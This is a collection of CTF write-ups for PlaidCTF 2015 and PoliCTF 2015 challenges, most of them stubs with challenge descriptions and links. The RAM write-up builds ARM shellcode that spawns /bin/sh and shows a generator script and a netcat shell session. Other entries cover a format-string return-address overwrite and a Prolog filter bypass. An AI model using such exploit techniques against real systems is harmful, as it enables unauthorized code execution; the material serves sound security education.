  * Done using format string `%4$p` - 4 is the Format Argument Number (`fmt_arg_4` - Terminology might be wrong here, plz fix). Prints the fourth address (after `buf`) by `snprintf`
* Create a reference to `rip` of `make_response` for a later change
  * Done using second format string `%.<bytestoprint>u%4$hn`. Here, `snprintf` looks changed the last 2 bytes of the content in address `0xFFFFD548` from `0xFFFFD568` to `0xFFFFD52C`, which now references to `make_response`'s `rip`.
* Redirect the address of `make_response`'s `rip` from `0x0804852C` to `buf`'s address `0x0804A080`.
  * Done using third format string `%.<bytestoprint>u%12$hn`

Since the third format string contains the shellcode, the effect of adding the shellcode has to be removed by subtraction - see [this better documented solution](solve,py).

## Other write-ups and resources

* [https://ctf-team.vulnhub.com/plaidctf-2015-ebp/](https://ctf-team.vulnhub.com/plaidctf-2015-ebp/)
* <http://geeksspeak.github.io/blog/2015/04/20/plaidctf-ctf-2015-ebp-writeup/>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/PCTF/pwnable/ebp>
* [Korean](http://blackcon.tistory.com/119)
* <http://pastebin.com/UHXYAMt2>
# PlaidCTF CTF 2015: PlaidDB

**Category:** Pwnable
**Points:** 550
**Solves:** 4
**Description:**

> Exploit [this database server](http://play.plaidctf.com/files/datastore_7e64104f876f0aa3f8330a409d9b9924.elf)
> 
> [Libc](http://play.plaidctf.com/files/libc_3f6aaa980b58f7c7590dee12d731e099.so.6)
> 
> Running at 52.4.86.204 64613

## Write-up

(TODO)

## Other write-ups and resources

* [FrizN - PlaidDB - pwn 550](http://blog.frizn.fr/pctf-2015/pwn-550-plaiddb)
* [wapiflapi - Single null-byte heap overflow](http://wapiflapi.github.io/2015/04/22/single-null-byte-heap-overflow/)
* <http://winesap.logdown.com/posts/261369-plaid-ctf-2015-plaiddb-writeup>
# PlaidCTF CTF 2015: Prodmanager

**Category:** Pwnable
**Points:** 180
**Solves:** 16
**Description:**

> Your manager wants to manage [his products](http://play.plaidctf.com/files/prodmanager_4d8d279676a55c81940198a31d8bc2f7).... 
> 
> 52.5.68.190 4667
> 
> 
> Team	Points	Submission
> dcua	187	7 hours ago
> Cykor+2	183	7 hours ago
> 0ops	181	6 hours ago

## Write-up

(TODO)

## Other write-ups and resources

* <http://ww9210.cn/2015/04/20/plaid-ctf-writeup-ebp-clifford-prodmanager/>
* <https://github.com/q3k/ctf/tree/master/PlaidCTF2015/prodmanager>
* [solution] (https://gist.github.com/anonymous/c9de6b5d3e20ea80dc27) from crowell
* <http://pastebin.com/Zc5s75jq>
# PlaidCTF CTF 2015: qttpd

**Category:** Pwnable
**Points:** 950 = 200 | 450 | 300
**Solves:** 52 = 52 | 0 | 0
**Description:**

> There are 3 (three) flags to be had at
> http://107.189.94.25 or
> http://107.189.94.255 or
> http://107.189.94.252 or
> http://107.189.94.253
> ... good luck!
> 
> 
> Part 1 (200 pts)
> Team	Points	Submission
> Cykor+2	208	2 days ago
> The Cat is Number 1	204	2 days ago
> PraetorianGs	202	2 days ago
> 
> Part 2 (450 pts)
> No solvers yet. 
> 
> Part 3 (300 pts)
> No solvers yet.

## Write-up

(TODO)

## Other write-ups and resources

* [whitehatters](https://www.whitehatters.academy/plaid-ctf-qttpd-part1/)
* <http://filedu.mp/29828b3c14629f02/exploit-part1a.sh>
* <http://capturetheswag.blogspot.com.au/2015/04/plaidctf-qttpd-pwnable-part-1-200-point.html>
* <https://neg9.org/news/2015/5/10/plaidctf-2015-qttpd-part-1-pwnable-200-writeup>
* <http://lokalhost.pl/ctf/pctf2015_qhttp2.txt>
* <http://coldwaterq.com/2015/05/08/qttpd-Part-One.html>
* <https://github.com/kitctf/writeups-plaidctf15/blob/master/qttp1/writeup.txt>
* <https://ctf.rip/plaidctf-qttpd-pwnable-part-1-200-poin/>
# PlaidCTF CTF 2015: RAM

**Category:** Pwnable
**Points:** 170
**Solves:** 31
**Description:**

> Hree is a ctue lttile selhlcdoe 
> [challenge](http://play.plaidctf.com/files/permute_33e624400463108ac96b45bc6158fa54.py) ([old version](http://play.plaidctf.com/files/permute_30b51ae3e1ce42cf57462073236b3a85.py)).
> 
> Server: 52.4.108.221 port 4444
> 
> 
> Team	Points	Submission
> fuzzi3	176	18 hours ago
> gallopsled	173	17 hours ago
> Tracer Tea	171	17 hours ago

## Write-up

by [geoff-addepar](https://github.com/geoff-addepar)

First, let's break down what the supplied python file does. Here is the first relevant section:

```python
buf = map(chr, range(256))

while 1:
    a,b = map(ord, sys.stdin.read(2))
    if a == b:
        break
    buf[a], buf[b] = buf[b], buf[a]
```

The first line creates a buffer containing '\x00\x01\x02 ... \xFF'. The next loop reads pairs of bytes from the input, and swaps arbitrary bytes in the buffer based on the user input. Since stdin is user-controlled, this lets us create any arbitrary permutation of the bytes from 0 to 255.

The next section of the file creates an executable file, writes an ELF header, dumps the permuted buffer into the ELF file, and executes it. There's one little thing to make things interesting:

```python
elf += pack('<HHI', 2, 0x28, 1) # type=exec, machine=ARM, version=1
```

That's right, we're going to be writing ARM machine code. At this point the solution is obvious, all we have to do is come up with some ARM machine instructions that get a shell, with the additional constraint that it has to be some permutation on the bytes from 0 to 255. Or, equivalently, we need ARM shellcode that never uses the same byte twice.

To solve this problem you'll need to grab an ARM toolchain and a userspace emulator to run the code locally.

```
sudo apt-get install qemu-user libc6-armel-cross libc6-dev-armel-cross binutils-arm-linux-gnueabi gcc-arm-linux-gnueabi
```

Let's start with some basic code to exec a shell on ARM, and then see what modifications we need to make in order to do it without ever reusing the same byte.

```
.text
.globl _start
_start:
    mov %r7, $11
    ldr %r0, =msg
    mov %r1, $0
    mov %r2, $0
    svc 0
msg:
    .asciz "/bin/sh"
```

Build and test, then objdump the result to see what our machine code looks like.

```
arm-linux-gnueabi-gcc -o arm.exe -nostartfiles -static arm.S
qemu-arm arm.exe
$ <we have a shell> exit
arm-linux-gnueabi-objdump -d arm.exe
```
```
00008098 <_start>:
    8098:	e3a0700b 	mov	r7, #11
    809c:	e59f0010 	ldr	r0, [pc, #16]	; 80b4 <msg+0x8>
    80a0:	e3a01000 	mov	r1, #0
    80a4:	e3a02000 	mov	r2, #0
    80a8:	ef000000 	svc	0x00000000

000080ac <msg>:
    80ac:	6e69622f 	.word	0x6e69622f
    80b0:	0068732f 	.word	0x0068732f
    80b4:	000080ac 	.word	0x000080ac
```

The most obviously reused byte in there is 0, and we can immediately see that there is going to be a problem with the `svc` instruction, which has 3 of them. But this is all assuming we use the EABI; searching around the internet shows that there is an older, obsolete syscall API, which puts the syscall number in the svc instruction. The older ABI also does not use r7, so we can get rid of the first instruction. We can also replace `mov` instructions with math instructions that do the same thing, and a bit of experimentation showed that r2 was already 0, and we don't need to overwrite it.

```
00008098 <_start>:
    8098:	e59f000c 	ldr	r0, [pc, #12]	; 80ac <msg+0x8>
    809c:	e0231003 	eor	r1, r3, r3
    80a0:	ef90000b 	svc	0x0090000b

000080a4 <msg>:
    80a4:	6e69622f 	.word	0x6e69622f
    80a8:	0068732f 	.word	0x0068732f
    80ac:	000080a4 	.word	0x000080a4

```

The next major obstacle is the '/' in '/bin/sh'. We need two slashes in the filename, which means we can't send the exact filename bytes as part of the input. The code also cannot self-modify, which means we have to transfer the filename to the stack somehow. We also need to generate the trailing 0 byte because we already used one in the `svc` instruction.

Here is a cut at copying '/bin/sh' to the stack:

```
00008098 <_start>:
    8098:	e0231003 	eor	r1, r3, r3
    809c:	e28f5018 	add	r5, pc, #24
    80a0:	e8150180 	ldmda	r5, {r7, r8}
    80a4:	e24d0008 	sub	r0, sp, #8
    80a8:	e2888001 	add	r8, r8, #1
    80ac:	e9200180 	stmdb	r0!, {r7, r8}
    80b0:	e5c01007 	strb	r1, [r0, #7]
    80b4:	ef90000b 	svc	0x0090000b

000080b8 <msg>:
    80b8:	6e69622f 	.word	0x6e69622f
    80bc:	7968732e 	.word	0x7968732e

```
That introduced another zero byte, which we can weed out by simply offsetting further up the stack. We can also eliminate duplication between the low bytes of the `ldmda` and the `stmdb` by using different registers and loading/storing dummy registers at the end.

The next thing to deal with is the common `e2` prefix on many of the instructions. That instruction byte contains a condition code field, which allows for conditional execution. What we can do is choose condition codes that are always true so that the instructions get executed. If we change the `eor` to an `eors`, then the 'Z' flag will always be set, so the `le` and `ls` conditions will always be true.

The last thing is the `10` in the `strb` instruction. The 1 comes from r1, which just needs to be any register containing a zero. We can use r2 or r3 instead, because they are initialized to zero by the loader.

```
00008098 <_start>:
    8098:	e0331003 	eors	r1, r3, r3
    809c:	928f501c 	addls	r5, pc, #28
    80a0:	e8151270 	ldmda	r5, {r4, r5, r6, r9, ip}
    80a4:	d24d0f41 	suble	r0, sp, #260	; 0x104
    80a8:	e2898001 	add	r8, r9, #1
    80ac:	e9204340 	stmdb	r0!, {r6, r8, r9, lr}
    80b0:	e5c03007 	strb	r3, [r0, #7]
    80b4:	ef90000b 	svc	0x0090000b

000080b8 <msg>:
    80b8:	6e69622f 	.word	0x6e69622f
    80bc:	7968732e 	.word	0x7968732e
```

Now we have code to get a shell, and it never uses the same byte twice. To turn this into a sequence of swaps that will generate the correct permutation, we can use a small python script:

```python
buf = map(chr, range(256))

f = open("arm.exe", "r")
binary = f.read()[0x98:0xc0]  # use a hex dump of the ELF file to find the offset of the code
f.close()

f = open("permutation.bin", "w")

for i in range(len(binary)):
  ch = binary[i]
  found = False
  for swap in range(i, 256):
    if buf[swap] == ch:
      found = True
      if i != swap:
        print "swapping", i, swap, ord(ch), hex(ord(ch))
        f.write(chr(i))
        f.write(chr(swap))
        buf[i], buf[swap] = buf[swap], buf[i]
  if not found:
    print "could not find character", ord(ch), hex(ord(ch))
    exit(1)

f.write(chr(0))
f.write(chr(0))
f.close()
```

Now we have a file containing the correct permutation. Send it to the server, but keep standard input connected to the terminal, so we can run commands in the shell we created.

```
$ cat permutation.bin - | nc 52.4.108.221 4444
ls
flag.txt
permute.py
submit
cat flag.txt
flag{shellcode_with_the_colors_of_the_rainbow_db43044f}
```

## Other write-ups and resources

* <https://neg9.org/news/2015/4/26/plaidctf-2015-ram-pwnable-170-writeup> 
# PlaidCTF CTF 2015: tp

**Category:** Pwnable
**Points:** 620 = 420 | 200
**Solves:** 11 = 6 | 5
**Description:**

> tp
> Pwnable (620 pts)
> [This service](http://play.plaidctf.com/files/problem_414d338fffb41107a3cf70bd0a7feffe.elf) does weird sandboxing stuff - exploit it and escape for 2 flags!
> 
> [Libc](http://play.plaidctf.com/files/libc_3f6aaa980b58f7c7590dee12d731e099.so.6)
> 
> Running at 52.4.157.141 1337

## Write-up

(TODO)

## Other write-ups and resources

* none yet# PlaidCTF CTF 2015: traveller

**Category:** Pwnable
**Points:** 280
**Solves:** 12
**Description:**

> You find an artifact that looks ancient, but yet looks like it's from the future... Upon further inspection, it looks like some sort of calculator, but it's calculation seems rather questionable. Maybe you can find who the owner of this is... 
> 
> Problem is located in /home/traveller. SSH for access 52.6.29.61
> 
> You can SSH to the (same) machine for env reasons. Your credentials are on your profile.
> 
> 
> Team	Points	Submission
> Cykor+2	291	13 hours ago
> 0ops	285	12 hours ago
> LC BC	282	11 hours ago

## Write-up

(TODO)

## Other write-ups and resources

* none yet# PlaidCTF CTF write-ups

* <http://reg.plaidctf.com/>
* [Scoreboard](http://reg.plaidctf.com/scoreboard) or [local alternative](scoreboard)

## Completed write-ups

* [crypto/curious](crypto/curious)
* [crypto/strength](crypto/strength)
* [forensics/png-uncorrupt](forensics/png-uncorrupt)
* [forensics/unknown](forensics/unknown)
* [misc/kolmogorov](misc/kolmogorov)
* [misc/sanity-check](misc/sanity-check)
* [pwnable/ebp](pwnable/ebp)
* [pwnable/ram](pwnable/ram)

## External write-ups only

* [crypto/lazy](crypto/lazy)
* [crypto/parlor2](crypto/parlor2)
* [misc/eces-revenge2](misc/eces-revenge2)
* [misc/sawed](misc/sawed)
* [pwnable/plaiddb](pwnable/plaiddb)
* [pwnable/prodmanager](pwnable/prodmanager)
* [pwnable/qttpd](pwnable/qttpd)
* [reversing/clifford](reversing/clifford)
* [reversing/cryptoserv](reversing/cryptoserv)
* [reversing/jumble-mumble](reversing/jumble-mumble)
* [reversing/re-gex](reversing/re-gex)
* [web/radhos](web/radhos)

## Missing write-ups

* [misc/ironic](misc/ironic)
* [pwnable/tp](pwnable/tp)
* [pwnable/traveller](pwnable/traveller)
* [reversing/angela-merkel](reversing/angela-merkel)# PlaidCTF CTF 2015: Angela Merkel

**Category:** Reversing
**Points:** 400
**Solves:** 0
**Description:**

> Jet fuel [can't melt steel beams .](http://play.plaidctf.com/files/dont_cheat_osx_yosemite_64_3c18b6aa6167ef59161b32921289c25e)
> 
> 
> No solvers yet.

## Write-up

(TODO)

## Other write-ups and resources

* none yet# PlaidCTF CTF 2015: Clifford

**Category:** Reversing
**Points:** 100
**Solves:** 70
**Description:**

> ["It's a keygen problem"](http://play.plaidctf.com/files/clifford_fb9d383f537c803a82b5040e801785e0.elf)
> 
> 
> (This is the original binary, it is 100% superseded by the new one and there is no reason you should look at it, but it is [here](http://play.plaidctf.com/files/clifford_d4db798d82a284a63341055200f2502d.elf) for posterity. )

## Write-up

(TODO)

## Other write-ups and resources

* [Plaid CTF 2015: Clifford](https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/PCTF/reversing/clifford)
* [sophia.re](http://sophia.re/plaid2015_clifford_writeup.html)
* <http://trich.im/?p=16>
# PlaidCTF CTF 2015: Cryptoserv

**Category:** Reversing
**Points:** 250
**Solves:** 37
**Description:**

> A tablespoon of [reversing](http://play.plaidctf.com/files/cryptoserv_redacted_2023c925bef7a45a177122b18662b19f.elf), a dash of [crypto](http://play.plaidctf.com/files/cryptoserv_9a13ae0c1436e3eaf6dbf6d84834108e.pcap), and three cups of love.
> 
> Running at 52.4.141.125 4141
> 
> Note that the binary you get is redacted version of the original (but, functionally equivalent).
> 
> 
> Team	Points	Submission
> LSE	260	a day ago
> 0xffa	255	a day ago
> 217	252	a day ago

## Write-up

(TODO)

## Other write-ups and resources

* <http://tasteless.eu/2015/04/plaidctf-2015-cryptoserv-reversing-250/>
* <http://trich.im/?p=16>
# PlaidCTF CTF 2015: Jumble Mumble

**Category:** Reversing
**Points:** 200
**Solves:** 44
**Description:**

> [My binary](http://play.plaidctf.com/files/jumble_mumble_7df06496932f57dbb7720b5763086be8.elf) seems to be a little bit jumbled! But I'm sure you can still recover the key...
> 
> tylerni7 is a terrible person, so md5sum your flag before submitting it.. (strip trailing 0s and md5sum with no newline)

## Write-up

(TODO)

## Other write-ups and resources

* <http://trich.im/?p=16>
* [Vietnamese](https://wizi1340.wordpress.com/2015/04/20/write-up-plaidctf-ctf-2015-jumble-mumble/)
* <https://github.com/wmliang/ctf/blob/master/jumble-mumble-solver.py>
* <https://gist.github.com/0xEBFE/b55fddb1281e16f23330>
* <http://pastebin.com/Ui9K2x0Y># PlaidCTF CTF 2015: RE GEX

**Category:** Reversing
**Points:** 250
**Solves:** 27
**Description:**

> Wow that's a big regex.... luckily regular languages are easy.
> 
> [Server](http://play.plaidctf.com/files/re_gex_62d057a9a99036ae4ca64d84e02b4833.py) with [this regex](http://play.plaidctf.com/files/regex_57f2cf49f6a354b4e8896c57a4e3c973.txt) running at 52.6.11.111
> 
> (Note our reference solution takes a couple hours (OFFLINE) so don't leave this to the last minute!) Oops, never mind, our reference solution doesn't take hours :-)
> 
> 
> Team	Points	Submission
> 0xffa	260	2 days ago
> Redacted	255	2 days ago
> fuzzi3	252	2 days ago

## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/frenchie16/7db29643943ebcf185bb>
* <http://www.securifera.com/blog/2015/04/23/plaidctf-2015-re-gex/>
* <https://neg9.org/news/2015/4/22/plaidctf-2015-re-gex-reversing-250-writeup>
* <https://github.com/wmliang/ctf/blob/master/regex-solver.py>
# PlaidCTF CTF 2015: radhos

**Category:** Web
**Points:** 250
**Solves:** 42
**Description:**

> A [web scale key value store](http://play.plaidctf.com/files/radhos_29bcdb2890991899b33f006623d3c1c8.py), for your enjoyment!
> 
> Should be working
> Running at 52.6.62.188 port 9009
> 
> 
> Team	Points	Submission
> LSE	260	a day ago
> 0xffa	255	a day ago
> 217	252	a day ago

## Write-up

(TODO)

## Other write-ups and resources

* [Plaid CTF 2015: radhos](http://vnsecurity.net/ctf%20-%20clgt%20crew/2015/04/20/ppp-radhos.html)
# PoliCTF 2015: 3DOGES2

**Category:** Crypto
**Points:** 400
**Solves:** 29
**Description:**

> Wanna talk with John? Join his supersecret communication channel. Of course it's secure, it uses a brand new hipster handmade cryptocipher! Amazingly unbreakable! The party is on

>> thedoges.polictf.it:80

>> GPG key: oliphushIkDeedTarWodVenEfyockOc2

>[3doges2](3doges2_73e23df92b0305a9d90c955c7f4ca7a2.tar.gz.gpg)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/BatmansKitchen/ctf-writeups/tree/master/2015-polictf>
* [sophia.re](http://www.sophia.re/polictf2015_3doges2_writeup.html)  
# PoliCTF 2015: Even the server lies (on a couch unfortunatel

**Category:** Crypto
**Points:** 250
**Solves:** 0
**Description:**

> What do we have here? It seems a normal session between a user and some google servers, but actually one of them is lazy and it's lying on a couch. What a bad luck! Will you be able to exploit this unforgivable behaviour?

>> GPG key: cyRotzeshkidCukizchockkadhorves0

>[even-the-server](even-the-server_bff2946bae773975e2631e111df6807b.tar.gz.gpg)

## Write-up

(TODO)

## Other write-ups and resources

* <https://towerofhanoi.github.io/polictf2015/crypto/Server-lies/>
# PoliCTF 2015: Exorcise

**Category:** Crypto
**Points:** 50
**Solves:** 132
**Description:**

> Simple Exorcise. Get the key! Connect to

>> exorcise.polictf.it:80

## Write-up

by [fariskhi](https://github.com/fariskhi)

As you can see in the problem's name, eXORcise involve a classic xor encryption. First six characters and last 228 characters of the encrypted text is dummy, the rest is hex encoded string of (plain_text) xor (key). This information is enough to get the key because if a xor b = c, then b = a xor c. You can send a long enough string (because we don't know the length of the key), convert the hex encoded text to string (don't include the dummy), and xor both to get the key. Xor result is a repeated string like "g{_this_1s_s0_simple_you_should_have_solved__it_1n_5_sec}flag{_this_1s_s0_simple....".

The flag is `flag{_this_1s_s0_simple_you_should_have_solved__it_1n_5_sec}`

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/polictf-2015-exorcise/>
* <https://zeta-two.com/ctf/2015/07/14/polictf-writeup.html#crypto50-exorcise>
# PoliCTF 2015: Prophet-Said

**Category:** Crypto
**Points:** 100
**Solves:** 72
**Description:**

> We found a paper with some weird words on it. Can you figure it out what does they mean? N.B.When you find the string flag{...} you may need another small step. Sorry about that.
>> GPG key: bunseykCydhecJadquivghigbultExLa 

> [prophet-said](prophet-said_9456d9724a9b7ae155e19c7a491c51e0.tar.gz.gpg)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/polictf-2015-and-the-prophet-said/>
* <http://www.pwntester.com/blog/2015/07/12/polictf-2015-crypto100-and-the-prophet-said/># PoliCTF 2015: Fragmented Key

**Category:** Forensics
**Points:** 400
**Solves:** 4
**Description:**

> You got this Uber-Secret file containing all the needed parts of the key to launch or disable forever a nuke... Save the world!

>> GPG key: kecNunBiebatubadupJotnagveitvosh

> [fragmented-key](fragmented-key_9635e49fe40f85c892c8e1a71516d0df.tar.gz.gpg)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# PoliCTF 2015: It's Hungry

**Category:** Forensics
**Points:** 100
**Solves:** 18
**Description:**

> Old McDonald had a farm. Old McDonald liked chiptune. He also needed to remind its daughter to take care about a zombie animal. But he wanted to do it discreetly, so he wrote this song. Can you find the message? (all lowercase, no spaces) N.B. flag is not in format flag{.+}

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on these writeups:

* <http://nandynarwhals.org/2015/07/13/polictf-2015-its-hungry-forensics-100/> 
* <https://zeta-two.com/ctf/2015/07/14/polictf-writeup.html#forensics100-hungry>
* <https://pequalsnp-team.github.io/writeups/its-hungry/>
* <http://b0rk.nl/ctf/2015/polictf/its-hungry.html>
* <http://fadec0d3.blogspot.de/2015/07/polictf-2015-its-hungry-100.html>

We are given a FLAC audio bitstream:

```bash
$ file oldmcdonald.flac
oldmcdonald.flac: FLAC audio bitstream data, 16 bit, stereo, 44.1 kHz, 6323646 samples
```

We can listen to it using `mplayer` or `sox` and hear a pleasant sounding track.

Using `metaflac` or `exiftool` we find the first red herring (Exif data field `Flag`):

```bash
+bash-4.3$ metaflac --list oldmcdonald.flac
METADATA block #0
  type: 0 (STREAMINFO)
  is last: false
  length: 34
  minimum blocksize: 4096 samples
  maximum blocksize: 4096 samples
  minimum framesize: 3729 bytes
  maximum framesize: 14093 bytes
  sample_rate: 44100 Hz
  channels: 2
  bits-per-sample: 16
  total samples: 6323646
  MD5 signature: 74cf7c267ccb4fbec7c6a38297808d8b
METADATA block #1
  type: 4 (VORBIS_COMMENT)
  is last: true
  length: 168
  vendor string: reference libFLAC 1.3.0 20130526
  comments: 7
    comment[0]: GENRE=Chiptune
    comment[1]: TRACKNUMBER=0
    comment[2]: ALBUM=PoliCTF15
    comment[3]: Flag=Yeah, dream on!
    comment[4]: TITLE=oldmcdonald
    comment[5]: DATE=2015
    comment[6]: ARTIST=rbino
+bash-4.3$ exiftool oldmcdonald.flac
ExifTool Version Number         : 9.99
File Name                       : oldmcdonald.flac
Directory                       : .
File Size                       : 18 MB
File Modification Date/Time     : 2015:12:25 14:16:40+01:00
File Access Date/Time           : 2015:12:25 15:23:10+01:00
File Inode Change Date/Time     : 2015:12:25 14:16:40+01:00
File Permissions                : rw-r--r--
File Type                       : FLAC
File Type Extension             : flac
MIME Type                       : audio/flac
Block Size Min                  : 4096
Block Size Max                  : 4096
Frame Size Min                  : 3729
Frame Size Max                  : 14093
Sample Rate                     : 44100
Channels                        : 2
Bits Per Sample                 : 16
Total Samples                   : 6323646
Vendor                          : reference libFLAC 1.3.0 20130526
Genre                           : Chiptune
Track Number                    : 0
Album                           : PoliCTF15
Flag                            : Yeah, dream on!
Title                           : oldmcdonald
Date                            : 2015
Artist                          : rbino
Duration                        : 0:02:23
```

Since this is a forensics challenge, we will first have a look at the [spectrogram](https://en.wikipedia.org/wiki/Spectrogram) to find anything unusual.

This can be done using `sox`'s `spectrogram` effect:

```bash
+bash-4.3$ sox oldmcdonald.flac -n spectrogram
+bash-4.3$ file spectrogram.png 
spectrogram.png: PNG image data, 944 x 593, 8-bit colormap, non-interlaced
```

The spectrogram over all frequencies (here: 0-22000kHz) and the complete time range (here: 0-143s) is the following:

![](./spectrogram-all.png)

It shows three interesting areas, in which the signal magnitude values (`dBFS`) are exceptionally high (yellow color).

We can create an adjusted spectrogram for each of these areas using `sox`'s trim effect:

`sox oldmcdonald.flac -n trim 55 5 spectrogram -o spectrogram-55-5.png`:

![](./spectrogram-55-5.png)

`sox oldmcdonald.flac -n trim 68.5 12.5 spectrogram -o spectrogram-68.5-12.5.png`:

![](./spectrogram-68.5-12.5.png)

`sox oldmcdonald.flac -n trim 129 1.5 spectrogram -o spectrogram-129-1.5.png`:

![](./spectrogram-129-1.5.png)

The first area/image tells us keep listening, while the third image is just a picture of a troll.

The second image is morsecode:

    -.-- --- ..- .- .-. . --- ...- . .-. -.-. --- -- .--. .-.. .. -.-. .- - .. -. --. .--- ..- ... - .-.. .. ... - . -.

Decoding this morsecode with any [online morsecode decoer](https://gc.de/gc/morse/), we see that it is another decoy/red herring - It says `you are overcomplicating just listen`.

We are told twice now to just listen to the flac itself - so maybe the code is hidden in the notes themselves?

Unfortunately, converting audio to sheet music is a very hard problem, so it has to be done by ear.

To do so, [one writeup](http://nandynarwhals.org/2015/07/13/polictf-2015-its-hungry-forensics-100/) suggests to use [this 8bit musical sequencer](http://www.pulseboy.com/).

In the end, you'll get [this note sheet](https://zeta-two.com/assets/other/oldmcdonald_score.pdf) - as described in [this writeup](https://zeta-two.com/ctf/2015/07/14/polictf-writeup.html#forensics100-hungry), with the respective notes:

    F4 E4 E4 D4 D4 A4 D4 E4 A4 D4 B3 E E4 F4

The flag is `feeddadeadbeef`.

PS: I can't adjust the frequencies limits/ranges using my sox version, but there is [a patch](http://jdesbonnet.blogspot.de/2014/02/sox-spectrogram-log-frequency-axis-and.html) to do so.

## Other write-ups and resources

* <http://nandynarwhals.org/2015/07/13/polictf-2015-its-hungry-forensics-100/> 
* <https://zeta-two.com/ctf/2015/07/14/polictf-writeup.html#forensics100-hungry>
* <https://pequalsnp-team.github.io/writeups/its-hungry/>
* <http://b0rk.nl/ctf/2015/polictf/its-hungry.html>
* <http://fadec0d3.blogspot.de/2015/07/polictf-2015-its-hungry-100.html>
# PoliCTF 2015: John in The Middle

**Category:** Forensics
**Points:** 100
**Solves:** 86
**Description:**

> Can John hijack your surfin'? :)

>> GPG key: GhairfAvvewvukDetolicDer-OcNayd#

> [john-in-the-middle](john-in-the-middle_153a4fa94b9c23459897157df4ed4105.tar.gz.gpg)

## Write-up

by [fariskhi](https://github.com/fariskhi)

Extract all files from pcap (you can use wireshark) and you can see logo.png is very different with original logo.png from http://polictf.it/images/logo.png. Using stegsolve or image manipulation tool, you can see the hidden text in the image.

![](logo.png?raw=true)

The flag is `flag{J0hn_th3_Sn1ff3r}`

## Other write-ups and resources

* <http://www.pwntester.com/blog/2015/07/12/polictf-forensics100/>
# PoliCTF 2015: Italian spies lost a file

**Category:** Forensics
**Points:** 250
**Solves:** 10
**Description:**

> HEY THESE ARE THE BEST ITALIAN SPIES TALKING. WE SENT OUR COLLEGUE TO DO A LITTLE JOB, HE SHOULD STOLE A SECRET CODE FROM A BAD GUY. BUT THE BAD GUY STILL DOESN'T HAVE A COMPUTER! -> !!!THAT'S CRAZY!!! INSTEAD, HE HAS A VERY GOOD STYLOGRAPHIC PEN. BUT OUR COLLEGUE WAS SO SMART THAT HE DID IT! HE STOLE THE SECRET FROM THAT BAD GUY! HE TOLD US "HEY GUYS, I STOLE THAT!" AAANDDD... WE KILLED HIM BECAUSE HE KNOWS TOO MUCH AHAHAHAHAHAHAHAHAHAHAHAH! NOW WE CAN'T FIGURE OUT HOW TO OPEN THE FILE THAT HE SENT US. PLZ HELP US :)

>> GPG key: CaTwyhayPhevIvEededalWujbapNiak8

> [lost-a-file](lost-a-file_0355e3a84b5cfdd1e66a8d2f84ce6301.tar.gz.gpg)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# PoliCTF 2015: John the Dropper

**Category:** Grab Bag
**Points:** 100
**Solves:** 51
**Description:**

> I am afraid John is in trouble. I feel he needs help but I can't find any message from him. John does not need a port to communicate.

>> dropper.polictf.it

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/polictf-2015-john-the-dropper/>
* <https://zeta-two.com/ctf/2015/07/14/polictf-writeup.html#grabbag100-john-the-dropper>
# PoliCTF 2015: Gandgalf

**Category:** Grab Bag
**Points:** 450
**Solves:** 0
**Description:**

> john loves riddles, he wants to challenge you to solve this one, will you be able to solve it?

>> gandgalf.polictf.it

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/ocean1/Gandgalf>
# PoliCTF 2015: Hard Interview

**Category:** Grab Bag
**Points:** 50
**Solves:** 208
**Description:**

> interview.polictf.it:80

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.mrt-prodz.com/blog/view/2015/07/polictf-2015---hard-interview-50pts-writeup>
# PoliCTF 2015: Lightning

**Category:** Grab Bag
**Points:** 500
**Solves:** 4
**Description:**

> You work as a security consultant, and one day a company calls you to solve a curious problem: after one night the company building was hit by a lightning, the vault could no longer be opened with the code, which is 0994. Unfortunately, the vault control hardware is inside the vault itself. You start building a breadboard prototype of the vault circuit, and after a lot of modeling and experiments, you come to the conclusion that the lightning has caused a "stuck at 1" fault on pin 14 of IC6. Based on the circuit diagram you come up with a code that could open the faulty vault. The flag is the concatenation of what appears on the display, and what you have to type in the keyboard. N.B. Flag is not in the format flag{.}

>> GPG key: mafdien+Queczygwargel_kainoaKnux

> [lightning](lightning_2b02a140e5adf66c4bb2360459174cbe.tar.gz.gpg)

## Write-up

(TODO)

## Other write-ups and resources
* <https://towerofhanoi.github.io/polictf2015/grabbag/Lightning/>
# PoliCTF 2015: Trollface

**Category:** Grab Bag
**Points:** 350
**Solves:** 3
**Description:**

> I think something is hidden here, something that may seem useless. ?

>> GPG key: yaxceburkaukvefinneuvUvjueknykfa

> [trollface](trollface_17b30738bc1e243bd2b01c5e7e30bf0a.tar.gz.gpg)

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.mheistermann.de/2015/07/12/polictf-2015-trollface-writeup/>
# PoliCTF 2015: Hanoi As A Service

**Category:** Pwnable
**Points:** 50
**Solves:** 191
**Description:**

> Check out our shiny new HaaS platform!
> nc haas.polictf.it 80

## Write-up

by [ezliang](https://github.com/ezliang)

This pwnable is pretty simple, it seems to be a tower of hanoi solver. 
>```bash
>$ nc haas.polictf.it 80
> Welcome to the Hanoi-as-a-Service cloud platform!
> How many disks does your tower have?
> 3
> * Move top disk from a to b
> * Move top disk from a to c
> * Move top disk from b to c
> * Move top disk from a to b
> * Move top disk from c to a
> * Move top disk from c to b
> * Move top disk from a to b
>```

After messing around with it and looking up error codes, it seems to be using prolog which is a logical programming language.

>```bash
>$ nc haas.polictf.it 80
> Welcome to the Hanoi-as-a-Service cloud platform!
> How many disks does your tower have?
>)
>ERROR: Prolog initialisation failed:
>ERROR: Syntax error: Illegal start of term
>ERROR: hanoi()
>ERROR: ** here **
>ERROR: ) . 
>```

Also there is a filter that terminates the session if anything os related is sent. After looking around on prolog functions, it turns out you can concatenate two atoms and use the call function on the result to by pass the filter. 

>```bash
>% nc haas.polictf.it 80
>Welcome to the Hanoi-as-a-Service cloud platform!
>How many disks does your tower have?
